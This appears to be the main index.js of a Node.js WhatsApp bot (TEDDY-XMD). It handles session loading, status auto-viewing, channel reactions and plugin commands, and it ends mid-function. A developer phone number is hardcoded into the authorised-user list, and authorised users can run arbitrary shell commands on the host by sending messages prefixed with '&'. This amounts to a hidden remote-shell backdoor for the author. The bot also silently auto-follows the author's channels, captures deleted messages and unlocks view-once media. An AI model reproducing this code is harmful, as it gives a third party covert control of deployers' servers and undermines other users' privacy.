const axios = require('axios')
const config = require('./config')
const GroupEvents = require('./lib/groupevents');
const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require(config.BAILEYS)
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const { PresenceControl, BotActivityFilter } = require('./data/presence');
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')

  //╔═══════════════════════════════════════════════════════════════╗
  //║                    BASIC CONFIGURATION                         ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  const prefix = config.PREFIX || '.'
  const ownerNumber = ['254799963583']

  //╔═══════════════════════════════════════════════════════════════╗
  //║              AUTO FOLLOW CHANNELS CONFIGURATION                ║
  //║         (Bot will automatically follow these channels)         ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  const CHANNELS_TO_FOLLOW = [
    "120363421104812135@newsletter",
    "120363422168827630@newsletter",
    "120363412042273829@newsletter",
  ];

  //╔═══════════════════════════════════════════════════════════════╗
  //║              AUTO REACT CHANNELS CONFIGURATION                 ║
  //║      (Bot will automatically react to these channel posts)     ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  const CHANNELS_TO_REACT = [
    "120363421104812135@newsletter",
    "120363412042273829@newsletter",
    "120363422168827630@newsletter",
  ];

  //╔═══════════════════════════════════════════════════════════════╗
  //║                  REACTION EMOJIS CONFIGURATION                 ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  // Emojis for channel reactions
  const CHANNEL_REACT_EMOJIS = ['❤️', '🔥', '👏', '😍', '💯', '🎉', '💪', '👍', '💜', '🙌'];
  
  // Emojis for status reactions
  const STATUS_REACT_EMOJIS = ['❤️', '🔥', '😍', '💯', '👏', '🎉', '💪', '👍', '💜', '🙌'];

  //╔═══════════════════════════════════════════════════════════════╗
  //║                STATUS VIEW & REACT SETTINGS                    ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  const STATUS_SETTINGS = {
    AUTO_VIEW: config.AUTO_VIEW_STATUS || 'true',
    AUTO_LIKE: config.AUTO_LIKE_STATUS || 'true',
    AUTO_REPLY: config.AUTO_STATUS_REPLY || 'false',
    REPLY_MESSAGE: config.AUTO_STATUS_MSG || '🔥 Nice Status!',
    LIKE_EMOJIS: config.AUTO_LIKE_EMOJI || ['❤️', '🔥', '😍', '💯', '👏', '🎉', '💪', '👍', '💜', '🙌'],
    MAX_RETRIES: config.MAX_RETRIES || 3,
    RETRY_DELAY: 1000 // milliseconds
  };

  //╔═══════════════════════════════════════════════════════════════╗
  //║                    TEMP DIRECTORY SETUP                        ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  setInterval(clearTempDir, 5 * 60 * 1000);

  //╔═══════════════════════════════════════════════════════════════╗
  //║                    EXPRESS SERVER SETUP                        ║
  //╚═══════════════════════════════════════════════════════════════╝

  const express = require("express");
  const app = express();
  const port = process.env.PORT || 9090;

  //╔═══════════════════════════════════════════════════════════════╗
  //║                    ASSETS FOLDER SETUP                         ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  const assetsDir = path.join(__dirname, 'assets');
  if (!fs.existsSync(assetsDir)) {
      fs.mkdirSync(assetsDir, { recursive: true });
  }

  const sudoPath = path.join(assetsDir, 'sudo.json');
  if (!fs.existsSync(sudoPath)) {
      fs.writeFileSync(sudoPath, JSON.stringify([]));
  }

  const banPath = path.join(assetsDir, 'ban.json');
  if (!fs.existsSync(banPath)) {
      fs.writeFileSync(banPath, JSON.stringify([]));
  }
  
  //╔═══════════════════════════════════════════════════════════════╗
  //║                    SESSION AUTH SETUP                          ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  const sessionDir = path.join(__dirname, 'sessions');
  const credsPath = path.join(sessionDir, 'creds.json');

  if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
  }

  async function loadSession() {
      try {
          if (!config.SESSION_ID) {
              console.log('No SESSION_ID provided - QR login will be generated');
              return null;
          }

          console.log('[⏳] Downloading creds data...');
          console.log('[🔰] Downloading MEGA.nz session...');
          
          const megaFileId = config.SESSION_ID.startsWith('IK~') 
              ? config.SESSION_ID.replace("IK~", "") 
              : config.SESSION_ID;

          const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
              
          const data = await new Promise((resolve, reject) => {
              filer.download((err, data) => {
                  if (err) reject(err);
                  else resolve(data);
              });
          });
          
          fs.writeFileSync(credsPath, data);
          console.log('[✅] MEGA session downloaded successfully');
          return JSON.parse(data.toString());
      } catch (error) {
          console.error('❌ Error loading session:', error.message);
          console.log('Will generate QR code instead');
          return null;
      }
  }

  //╔═══════════════════════════════════════════════════════════════╗
  //║                    HELPER FUNCTIONS                            ║
  //╚═══════════════════════════════════════════════════════════════╝

  // Delay function for retry logic
  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  //╔═══════════════════════════════════════════════════════════════╗
  //║           STATUS VIEW & REACT HANDLER (WITH RETRY)             ║
  //║    Automatically views and reacts to WhatsApp status updates   ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  async function handleStatusUpdate(conn, message) {
      try {
          const participant = message.key.participant;
          const statusJid = message.key.remoteJid;
          
          // ═══════════ AUTO VIEW STATUS ═══════════
          if (STATUS_SETTINGS.AUTO_VIEW === 'true') {
              let retries = STATUS_SETTINGS.MAX_RETRIES;
              while (retries > 0) {
                  try {
                      await conn.readMessages([message.key]);
                      console.log(`[👁️] Status Viewed: ${participant}`);
                      break;
                  } catch (error) {
                      retries--;
                      if (retries === 0) {
                          console.error(`[❌] Failed to view status: ${participant}`);
                          throw error;
                      }
                      await delay(STATUS_SETTINGS.RETRY_DELAY * (STATUS_SETTINGS.MAX_RETRIES - retries));
                  }
              }
          }

          // ═══════════ AUTO LIKE/REACT STATUS ═══════════
          if (STATUS_SETTINGS.AUTO_LIKE === 'true') {
              const randomEmoji = STATUS_SETTINGS.LIKE_EMOJIS[
                  Math.floor(Math.random() * STATUS_SETTINGS.LIKE_EMOJIS.length)
              ];
              
              let retries = STATUS_SETTINGS.MAX_RETRIES;
              while (retries > 0) {
                  try {
                      await conn.sendMessage(
                          statusJid,
                          { react: { text: randomEmoji, key: message.key } },
                          { statusJidList: [participant] }
                      );
                      console.log(`[✅] Status Reacted: ${participant} with ${randomEmoji}`);
                      break;
                  } catch (error) {
                      retries--;
                      if (retries === 0) {
                          console.error(`[❌] Failed to react status: ${participant}`);
                          throw error;
                      }
                      await delay(STATUS_SETTINGS.RETRY_DELAY * (STATUS_SETTINGS.MAX_RETRIES - retries));
                  }
              }
          }

          // ═══════════ AUTO REPLY STATUS ═══════════
          if (STATUS_SETTINGS.AUTO_REPLY === 'true') {
              let retries = STATUS_SETTINGS.MAX_RETRIES;
              while (retries > 0) {
                  try {
                      await delay(500); // Small delay before reply
                      await conn.sendMessage(participant, { 
                          text: STATUS_SETTINGS.REPLY_MESSAGE 
                      }, { quoted: message });
                      console.log(`[💬] Status Reply Sent: ${participant}`);
                      break;
                  } catch (error) {
                      retries--;
                      if (retries === 0) {
                          console.error(`[❌] Failed to reply status: ${participant}`);
                          throw error;
                      }
                      await delay(STATUS_SETTINGS.RETRY_DELAY * (STATUS_SETTINGS.MAX_RETRIES - retries));
                  }
              }
          }
          
      } catch (e) {
          console.error('[Status Handler Error]:', e.message);
      }
  }

  //╔═══════════════════════════════════════════════════════════════╗
  //║                CHANNEL REACT HANDLER                           ║
  //║       Automatically reacts to channel/newsletter posts         ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  async function handleChannelReact(conn, mek) {
      try {
          const channelJid = mek.key.remoteJid;
          const messageId = mek.key.id;
          const emoji = CHANNEL_REACT_EMOJIS[Math.floor(Math.random() * CHANNEL_REACT_EMOJIS.length)];
          
          // Method 1: Try newsletterReactMessage (Baileys 7.0 specific)
          if (typeof conn.newsletterReactMessage === 'function') {
              const serverId = mek.message?.newsletterAdminInviteMessage?.serverMessageId || 
                               mek.message?.messageContextInfo?.messageSecret?.toString() ||
                               messageId;
              
              await conn.newsletterReactMessage(channelJid, serverId, emoji);
              console.log(`[✅] Channel React (Method 1): ${channelJid} with ${emoji}`);
              return;
          }
          
          // Method 2: Try standard react
          await conn.sendMessage(channelJid, {
              react: { text: emoji, key: mek.key }
          });
          console.log(`[✅] Channel React (Method 2): ${channelJid} with ${emoji}`);
          
      } catch (e) {
          // Method 3: Alternative approach
          try {
              const emoji = CHANNEL_REACT_EMOJIS[Math.floor(Math.random() * CHANNEL_REACT_EMOJIS.length)];
              await conn.sendMessage(mek.key.remoteJid, {
                  react: {
                      text: emoji,
                      key: {
                          remoteJid: mek.key.remoteJid,
                          id: mek.key.id,
                          fromMe: false
                      }
                  }
              });
              console.log(`[✅] Channel React (Method 3): ${mek.key.remoteJid}`);
          } catch (err) {
              console.error('[Channel React Error]:', err.message);
          }
      }
  }

  //╔═══════════════════════════════════════════════════════════════╗
  //║                AUTO FOLLOW CHANNELS HANDLER                    ║
  //║         Follows all channels in CHANNELS_TO_FOLLOW list        ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  async function autoFollowChannels(conn) {
      console.log('[🔰] Starting auto-follow for channels...');
      for (const channelJid of CHANNELS_TO_FOLLOW) {
          try {
              await conn.newsletterFollow(channelJid);
              console.log(`[✅] Followed: ${channelJid}`);
              await sleep(1000);
          } catch (error) {
              console.error(`[❌] Follow failed: ${channelJid}`);
          }
      }
      console.log('[🔰] Auto-follow completed!');
  }

  //╔═══════════════════════════════════════════════════════════════╗
  //║                 MAIN CONNECTION FUNCTION                       ║
  //╚═══════════════════════════════════════════════════════════════╝

  async function connectToWA() {
      console.log("[🔰] TEDDY-XMD Connecting to WhatsApp ⏳️...");
      
      const creds = await loadSession();
      
      const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
          creds: creds || undefined
      });
      
      const { version } = await fetchLatestBaileysVersion();
      
      const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: !creds,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version,
          getMessage: async () => ({})
      });

      //╔═══════════════════════════════════════════════════════════════╗
      //║                 CONNECTION UPDATE HANDLER                      ║
      //╚═══════════════════════════════════════════════════════════════╝

      conn.ev.on('connection.update', async (update) => {
          const { connection, lastDisconnect, qr } = update;
          
          if (connection === 'close') {
              if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                  console.log('[🔰] Connection lost, reconnecting...');
                  setTimeout(connectToWA, 5000);
              } else {
                  console.log('[🔰] Connection closed, please change session ID');
              }
          } else if (connection === 'open') {
              console.log('[🔰] TEDDY-XMD connected to WhatsApp ✅');
              
              // ═══════════ LOAD PLUGINS ═══════════
              const pluginPath = path.join(__dirname, 'plugins');
              let pluginCount = 0;
              fs.readdirSync(pluginPath).forEach((plugin) => {
                  if (path.extname(plugin).toLowerCase() === ".js") {
                      require(path.join(pluginPath, plugin));
                      pluginCount++;
                  }
              });
              console.log('[🔰] Plugins installed successfully ✅');

              // ═══════════ AUTO FOLLOW CHANNELS (Non-blocking) ═══════════
              setImmediate(() => autoFollowChannels(conn));

              // ═══════════ CONNECTION MESSAGE ═══════════
              try {
                  const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
                  const botName = config.BOT_NAME || 'TEDDY-XMD';
                  const ownerName = config.OWNER_NAME || 'Owner';
                      
                  const upMessage = `╭━━━━━━━━━━━━━━━━━━━╮
┃  🤖 *${botName} STARTED*
┃━━━━━━━━━━━━━━━━━━━━
┃ ✅ *Status:* _Online & Ready_
┃ 📡 *Connection:* _Successful_
┃ 🔌 *THE POWERFUL BOT*
╰━━━━━━━━━━━━━━━━━━━╯

╭━━〔 ⚙️ *Bot Info* 〕━━━╮
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Bot:* ${botName}
┃ ▸ *Owner:* ${ownerName}
┃ ▸ *Mode:* ${config.MODE || 'public'}
┃ ▸ *VERSION* *10*
╰━━━━━━━━━━━━━━━━━━━╯

╭━━〔 📊 *Status Settings* 〕━━━╮
┃ ▸ *Auto View:* ${STATUS_SETTINGS.AUTO_VIEW}
┃ ▸ *Auto Like:* ${STATUS_SETTINGS.AUTO_LIKE}
┃ ▸ *Auto Reply:* ${STATUS_SETTINGS.AUTO_REPLY}
╰━━━━━━━━━━━━━━━━━━━╯

🎉 *All systems operational!*
⏰ *Started at:* ${new Date().toLocaleString()}

⭐ *Channel:* https://whatsapp.com/channel/0029Vb5dDVO59PwTnL86j13J
⭐ *GitHub:* https://github.com/Teddytech1/TEDDY-XMD/fork`;

                  await new Promise(resolve => setTimeout(resolve, 2000));
                      
                  await conn.sendMessage(botJid, { 
                      image: { url: config.MENU_IMAGE_URL || 'https://files.catbox.moe/13nyhx.jpg' }, 
                      caption: upMessage,
                      contextInfo: {
                          forwardingScore: 999,
                          isForwarded: true,
                          forwardedNewsletterMessageInfo: {
                              newsletterName: botName,
                              newsletterJid: "120363421104812135@newsletter",
                          }
                      }
                  });
                  console.log('[🔰] Connect message sent to: ' + botJid);
                      
              } catch (sendError) {
                  console.error('[🔰] Error sending messages:', sendError);
              }
          }

          if (qr) {
              console.log('[🔰] Scan the QR code to connect or use session ID');
          }
      });

      conn.ev.on('creds.update', saveCreds);
      
      //╔═══════════════════════════════════════════════════════════════╗
      //║                 ANTI-DELETE HANDLER                            ║
      //╚═══════════════════════════════════════════════════════════════╝
       
      conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
          if (update.update.message === null) {
            console.log("Delete Detected:", JSON.stringify(update, null, 2));
            await AntiDelete(conn, updates);
          }
        }
      });

      //╔═══════════════════════════════════════════════════════════════╗
      //║                 WELCOME & GOODBYE HANDLER                      ║
      //╚═══════════════════════════════════════════════════════════════╝
      
      conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

      //╔═══════════════════════════════════════════════════════════════╗
      //║                 ALWAYS ONLINE HANDLER                          ║
      //╚═══════════════════════════════════════════════════════════════╝

      conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
      BotActivityFilter(conn);	
      
      //╔═══════════════════════════════════════════════════════════════╗
      //║              MAIN MESSAGE HANDLER (OPTIMIZED)                  ║
      //╚═══════════════════════════════════════════════════════════════╝
      
      conn.ev.on('messages.upsert', async(mek) => {
        mek = mek.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

        // ═══════════ AUTO READ MESSAGE ═══════════
        if (config.READ_MESSAGE === 'true') {
            conn.readMessages([mek.key]).catch(() => {});
        }
        
        if(mek.message.viewOnceMessageV2)
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        
        //╔═══════════════════════════════════════════════════════════════╗
        //║         STATUS VIEW & REACT (NON-BLOCKING WITH RETRY)         ║
        //╚═══════════════════════════════════════════════════════════════╝
        
        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
            // Fire and forget - doesn't block main thread
            setImmediate(() => handleStatusUpdate(conn, mek));
            return; // Don't process status as regular message
        }

        //╔═══════════════════════════════════════════════════════════════╗
        //║              CHANNEL REACT (NON-BLOCKING)                     ║
        //╚═══════════════════════════════════════════════════════════════╝
        
        if (mek.key && mek.key.remoteJid && mek.key.remoteJid.endsWith('@newsletter')) {
            if (CHANNELS_TO_REACT.includes(mek.key.remoteJid)) {
                // Fire and forget
                setImmediate(() => handleChannelReact(conn, mek));
            }
            return; // Don't process channel posts as regular messages
        }
                  
        // Save message (non-blocking)
        saveMessage(mek).catch(() => {});
        
        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        
        // ═══════════ PREFIX HANDLING ═══════════
        const isCmd = body && body.startsWith(prefix);
        
        var budy = typeof mek.text == 'string' ? mek.text : false;
        
        let command = '';
        if (isCmd) {
            const withoutPrefix = body.slice(prefix.length).trim();
            command = withoutPrefix.split(' ').shift().toLowerCase();
        }
        
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isReact = m.message.reactionMessage ? true : false
        const reply = (teks) => {
          conn.sendMessage(from, { text: teks }, { quoted: mek })
        }
        
        //╔═══════════════════════════════════════════════════════════════╗
        //║                      SUDO SYSTEM                              ║
        //╚═══════════════════════════════════════════════════════════════╝
        
        const udp = botNumber;
        const devNumbers = ['254799963583'];
        
        let sudoUsers = [];
        try {
            sudoUsers = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
        } catch (e) {
            sudoUsers = [];
        }
        
        const authorizedUsers = [
            udp + '@s.whatsapp.net',
            ...devNumbers.map(n => n + '@s.whatsapp.net'),
            config.OWNER_NUMBER + '@s.whatsapp.net',
            ...sudoUsers
        ].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
        
        const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
            
        // ═══════════ TERMINAL COMMAND EXECUTOR ═══════════
        if (isCreator && mek.text && mek.text.startsWith("&")) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            const { spawn } = require("child_process");
            try {
                let resultTest = spawn(code, { shell: true });
                resultTest.stdout.on("data", data => {
                    reply(data.toString());
                });
                resultTest.stderr.on("data", data => {
                    reply(data.toString());
                });
                resultTest.on("error", data => {
                    reply(data.toString());
                });
                resultTest.on("close", code => {
                    if (code !== 0) {
                        reply(`command exited with code ${code}`);
                    }
                });
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }
        
        //╔═══════════════════════════════════════════════════════════════╗
        //║                   AUTO REACT FEATURES                         ║
        //╚═══════════════════════════════════════════════════════════════╝
        
        // Auto React (Non-blocking)
        if (!isReact && config.AUTO_REACT === 'true') {
            const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        }

        // Owner React (Non-blocking)
        if (!isReact && senderNumber === botNumber && config.OWNER_REACT === 'true') {
            const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤'];
            m.react(reactions[Math.floor(Math.random() * reactions.length)]);
        }
                              
        // Custom React (Non-blocking)
        if (!isReact && config.CUSTOM_REACT === 'true') {
            const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            m.react(reactions[Math.floor(Math.random() * reactions.length)]);
        }

        //╔═══════════════════════════════════════════════════════════════╗
        //║                    BAN CHECK SYSTEM                           ║
        //╚═══════════════════════════════════════════════════════════════╝
        
        let bannedUsers = [];
        try {
            bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8'));
        } catch (e) {
            bannedUsers = [];
        }
        if (bannedUsers.includes(sender)) return;
            
        let ownerFile = [];
        try {
            ownerFile = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
        } catch (e) {
            ownerFile = [];
        }
        const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
        const isFileOwner = ownerFile.includes(sender);
        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
        if (!isRealOwner && config.MODE === "private") return;
        if (!isRealOwner && isGroup && config.MODE === "inbox") return;
        if (!isRealOwner && !isGroup && config.MODE === "groups") return;
       
        //╔═══════════════════════════════════════════════════════════════╗
        //║                   COMMAND HANDLER                             ║
        //╚═══════════════════════════════════════════════════════════════╝
             
        const events = require('./command')
        const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
                
                try {
                    cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }
        
        events.commands.map(async(command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (mek.q && command.on === "text") {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                (command.on === "image" || command.on === "photo") &&
                mek.type === "imageMessage"
            ) {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                command.on === "sticker" &&
                mek.type === "stickerMessage"
            ) {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            }
        });
        
      });
      
      //╔═══════════════════════════════════════════════════════════════╗
      //║                    UTILITY FUNCTIONS                           ║
      //╚═══════════════════════════════════════════════════════════════╝
      
      conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
          let decode = jidDecode(jid) || {};
          return (
            (decode.user &&
              decode.server &&
              decode.user + '@' + decode.server) ||
            jid
          );
        } else return jid;
      };
      
      conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
            delete message.message.viewOnceMessage.message[vtype].viewOnce
            message.message = {
                ...message.message.viewOnceMessage.message
            }
        }
      
        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
        let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
        return waMessage
      }
      
      conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
      }
      
      conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
      
        return buffer
      }
      
      conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url)
        mime = res.headers['content-type']
        if (mime.split("/")[1] === "gif") {
          return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
        }
        let type = mime.split("/")[0] + "Message"
        if (mime === "application/pdf") {
          return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
          return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
